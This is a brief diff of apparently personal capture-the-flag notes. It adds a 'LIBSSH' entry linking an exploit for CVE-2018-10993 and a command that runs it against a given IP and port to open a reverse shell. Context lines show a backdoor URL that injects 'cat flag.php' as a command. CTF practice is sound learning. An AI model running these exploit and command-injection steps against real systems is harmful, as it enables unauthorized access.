@@ -74,6 +74,10 @@ NODIFFBACKDOOR
 	in URL: http://34.107.71.117:32023/?welldone=knockknock&shazam=cat%20flag.php
 	and open source page
 
+LIBSSH
+Link for exploit https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
+Creating rev shell: python3 cve-2018-10993.py 34.89.210.219 -p 31919 -s
+
 
 
 
